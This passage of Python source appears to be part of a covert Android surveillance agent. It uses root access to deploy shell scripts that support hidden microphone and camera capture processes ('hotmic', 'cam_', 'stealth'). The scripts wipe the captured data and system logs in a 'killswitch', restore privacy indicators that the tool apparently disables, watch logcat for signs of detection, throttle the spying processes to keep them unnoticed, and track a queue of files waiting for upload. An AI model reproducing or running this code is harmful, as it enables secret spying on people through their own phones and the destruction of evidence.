    openssl enc -aes-256-gcm -salt -in "$INPUT_FILE" -out "$OUTPUT_FILE" -k "$KEY" 2>/dev/null
    if [ $? -eq 0 ]; then
        # Add integrity signature
        echo "$(date +%s):$(sha256sum \"$OUTPUT_FILE\" | cut -d' ' -f1)" >> "${{OUTPUT_FILE}}.sig"
        rm -f "$INPUT_FILE"  # Remove original
    fi
fi
'''
            
            with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
                f.write(encrypt_script)
                script_path = f.name
            
            deploy_cmd = ["su", "-c", f"cp {script_path} /data/local/tmp/encrypt_file && chmod 755 /data/local/tmp/encrypt_file"]
            subprocess.run(deploy_cmd, capture_output=True)
            os.unlink(script_path)
            
        except Exception as e:
            print(f"[!] Encrypted channels setup failed: {e}")
    
    def _setup_killswitch_triggers(self):
        """Setup killswitch triggers for emergency surveillance termination"""
        try:
            killswitch_script = '''
#!/system/bin/sh
# Emergency killswitch for surveillance operations

# Kill all surveillance processes
pkill -f "hotmic_"
pkill -f "cam_"
pkill -f "stealth"
pkill -f "continuous_capture"
pkill -f "upload_handler"

# Wipe surveillance data
find /data/local/tmp -name "*hotmic*" -delete 2>/dev/null
find /data/local/tmp -name "*cam_*" -delete 2>/dev/null
find /data/local/tmp -name "*stealth*" -delete 2>/dev/null
find /data/local/tmp -name "*chunk*" -delete 2>/dev/null

# Clear upload queue
> /data/local/tmp/upload_queue.txt

# Disable privacy bypasses
settings put global privacy_indicators_enabled 1
settings put secure mic_camera_access_notification_enabled 1

# Clear logs
> /data/local/tmp/integrity.log
> /data/system/dropbox/*

echo "$(date): Emergency killswitch activated" >> /data/local/tmp/killswitch.log
'''
            
            with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
                f.write(killswitch_script)
                script_path = f.name
            
            deploy_cmd = ["su", "-c", f"cp {script_path} /data/local/tmp/killswitch && chmod 755 /data/local/tmp/killswitch"]
            subprocess.run(deploy_cmd, capture_output=True)
            os.unlink(script_path)
            

            trigger_script = '''
#!/system/bin/sh
while true; do
    # Battery level trigger
    BATTERY=$(dumpsys battery | grep level | cut -d: -f2 | tr -d ' ')
    if [ "$BATTERY" -lt 5 ]; then
        /data/local/tmp/killswitch
        exit 0
    fi
    
    # Killswitch file trigger
    if [ -f "/data/local/tmp/.emergency_stop" ]; then
        /data/local/tmp/killswitch
        rm -f /data/local/tmp/.emergency_stop
        exit 0
    fi
    
    # Time-based trigger (24 hours)
    START_TIME=$(cat /data/local/tmp/.surveillance_start 2>/dev/null || echo 0)
    CURRENT_TIME=$(date +%s)
    if [ $((CURRENT_TIME - START_TIME)) -gt 86400 ]; then
        /data/local/tmp/killswitch
        exit 0
    fi
    
    sleep 60
done
'''
            
            with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
                f.write(trigger_script)
                script_path = f.name
            
            deploy_cmd = ["su", "-c", f"cp {script_path} /data/local/tmp/killswitch_monitor && chmod 755 /data/local/tmp/killswitch_monitor"]
            subprocess.run(deploy_cmd, capture_output=True)
            os.unlink(script_path)
            

            monitor_cmd = ["su", "-c", "nohup /data/local/tmp/killswitch_monitor > /dev/null 2>&1 &"]
            subprocess.run(monitor_cmd, capture_output=True)
            

            start_cmd = ["su", "-c", f"echo {int(time.time())} > /data/local/tmp/.surveillance_start"]
            subprocess.run(start_cmd, capture_output=True)
            
        except Exception as e:
            print(f"[!] Killswitch setup failed: {e}")
    
    def _optimize_cpu_scheduling(self):
        """Optimize CPU scheduling for surveillance processes"""
        try:

            renice_cmd = ["su", "-c", "renice +10 $(pgrep -f 'hotmic|cam_|stealth')"]
            subprocess.run(renice_cmd, capture_output=True)
            

            if self._get_cpu_count() > 4:
                affinity_cmd = ["su", "-c", "taskset -cp 0-3 $(pgrep -f 'hotmic|cam_|stealth')"]
                subprocess.run(affinity_cmd, capture_output=True)
                
        except Exception as e:
            print(f"[!] CPU optimization failed: {e}")
    
    def _optimize_memory_usage(self):
        """Optimize memory usage for surveillance operations"""
        try:

            memory_script = '''
#!/system/bin/sh
# Limit memory usage of surveillance processes
for pid in $(pgrep -f "hotmic|cam_|stealth"); do
    echo 134217728 > /proc/$pid/oom_score_adj  # 128MB limit
done

# Periodic memory cleanup
echo 3 > /proc/sys/vm/drop_caches
'''
            
            with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
                f.write(memory_script)
                script_path = f.name
            
            deploy_cmd = ["su", "-c", f"cp {script_path} /data/local/tmp/optimize_memory && chmod 755 /data/local/tmp/optimize_memory"]
            subprocess.run(deploy_cmd, capture_output=True)
            os.unlink(script_path)
            
        except Exception as e:
            print(f"[!] Memory optimization failed: {e}")
    
    def _optimize_io_priorities(self):
        """Optimize I/O priorities for surveillance operations"""
        try:

            ionice_cmd = ["su", "-c", "ionice -c 3 -p $(pgrep -f 'hotmic|cam_|stealth')"]
            subprocess.run(ionice_cmd, capture_output=True)
            
        except Exception as e:
            print(f"[!] I/O optimization failed: {e}")
    
    def _setup_thermal_management(self):
        """Setup thermal management to prevent overheating during surveillance"""
        try:
            thermal_script = '''
#!/system/bin/sh
while true; do
    # Check thermal zones
    for zone in /sys/class/thermal/thermal_zone*/temp; do
        if [ -f "$zone" ]; then
            temp=$(cat "$zone")
            # If temperature > 70C, reduce surveillance activity
            if [ "$temp" -gt 70000 ]; then
                # Reduce surveillance process priority
                renice +15 $(pgrep -f "hotmic|cam_|stealth")
                # Pause continuous operations
                pkill -STOP -f "continuous_capture"
                sleep 30
                pkill -CONT -f "continuous_capture"
            fi
        fi
    done
    sleep 60
done
'''
            
            with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
                f.write(thermal_script)
                script_path = f.name
            
            deploy_cmd = ["su", "-c", f"cp {script_path} /data/local/tmp/thermal_monitor && chmod 755 /data/local/tmp/thermal_monitor"]
            subprocess.run(deploy_cmd, capture_output=True)
            os.unlink(script_path)
            

            monitor_cmd = ["su", "-c", "nohup /data/local/tmp/thermal_monitor > /dev/null 2>&1 &"]
            subprocess.run(monitor_cmd, capture_output=True)
            
        except Exception as e:
            print(f"[!] Thermal management setup failed: {e}")
    
    def _setup_health_monitoring(self):
        """Setup health monitoring for surveillance operations"""
        try:

            self._update_surveillance_metrics()
            

            if self.surveillance_metrics.get('bypass_success_rate', 1.0) < 0.7:
                self.agent.offline_logger.log_event('surveillance_health_warning', {
                    'bypass_success_rate': self.surveillance_metrics['bypass_success_rate'],
                    'recommendation': 'Consider switching to fallback methods'
                })
                
        except Exception as e:
            print(f"[!] Health monitoring setup failed: {e}")
    
    def _setup_alerting_system(self):
        """Setup alerting system for surveillance operations"""
        try:

            alert_script = '''
#!/system/bin/sh
# Monitor for potential detection
logcat -d | grep -i "camera\|microphone\|privacy\|permission" | tail -10 > /tmp/recent_alerts.log

# Check for suspicious activity
if grep -q "denied" /tmp/recent_alerts.log; then
    echo "$(date): Potential detection event" >> /data/local/tmp/surveillance_alerts.log
fi

# Clean up
rm -f /tmp/recent_alerts.log
'''
            
            with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
                f.write(alert_script)
                script_path = f.name
            
            deploy_cmd = ["su", "-c", f"cp {script_path} /data/local/tmp/surveillance_alerts && chmod 755 /data/local/tmp/surveillance_alerts"]
            subprocess.run(deploy_cmd, capture_output=True)
            os.unlink(script_path)
            
        except Exception as e:
            print(f"[!] Alerting system setup failed: {e}")
    
    def _update_surveillance_metrics(self):
        """Update surveillance metrics for monitoring"""
        try:
            current_time = time.time()
            uptime = current_time - self.surveillance_metrics.get('start_time', current_time)
            

            total_ops = self.surveillance_metrics['operations_completed']
            self.surveillance_metrics['operations_per_minute'] = (total_ops / (uptime / 60)) if uptime > 0 else 0
            

            self.surveillance_metrics.update({
                'uptime_minutes': uptime / 60,
                'memory_usage_mb': self._get_current_memory_usage(),
                'cpu_usage_percent': self._get_current_cpu_usage(),
                'network_usage_mb': self._get_network_usage()
            })
            
        except Exception as e:
            print(f"[!] Metrics update failed: {e}")
    
    def _get_cpu_count(self) -> int:
        """Get number of CPU cores"""
        try:
            return int(subprocess.run(["nproc"], capture_output=True, text=True).stdout.strip())
        except Exception:
            return 4
    
    def _get_current_memory_usage(self) -> int:
        """Get current memory usage in MB"""
        try:

            pids = subprocess.run(["pgrep", "-f", "hotmic|cam_|stealth"], capture_output=True, text=True).stdout.strip().split()
            total_mem = 0
            for pid in pids:
                if pid:
                    try:
                        with open(f'/proc/{pid}/status', 'r') as f:
                            for line in f:
                                if 'VmRSS:' in line:
                                    mem_kb = int(line.split()[1])
                                    total_mem += mem_kb // 1024
                                    break
                    except Exception:
                        continue
            return total_mem
        except Exception:
            return 0
    
    def _get_current_cpu_usage(self) -> float:
        """Get current CPU usage percentage for surveillance processes"""
        try:
            result = subprocess.run(["ps", "-o", "pid,pcpu,comm"], capture_output=True, text=True)
            total_cpu = 0.0
            for line in result.stdout.split('\n'):
                if any(term in line.lower() for term in ['hotmic', 'cam_', 'stealth']):
                    parts = line.split()
                    if len(parts) >= 2:
                        try:
                            total_cpu += float(parts[1])
                        except ValueError:
                            continue
            return total_cpu
        except Exception:
            return 0.0
    
    def _get_network_usage(self) -> int:
        """Get network usage in MB for surveillance operations"""
        try:


            upload_queue_size = 0
            if os.path.exists('/data/local/tmp/upload_queue.txt'):
                with open('/data/local/tmp/upload_queue.txt', 'r') as f:
                    lines = f.readlines()
                    for line in lines:
                        file_path = line.strip()
                        if os.path.exists(file_path):
                            upload_queue_size += os.path.getsize(file_path)
            return upload_queue_size // (1024 * 1024)
        except Exception:
            return 0
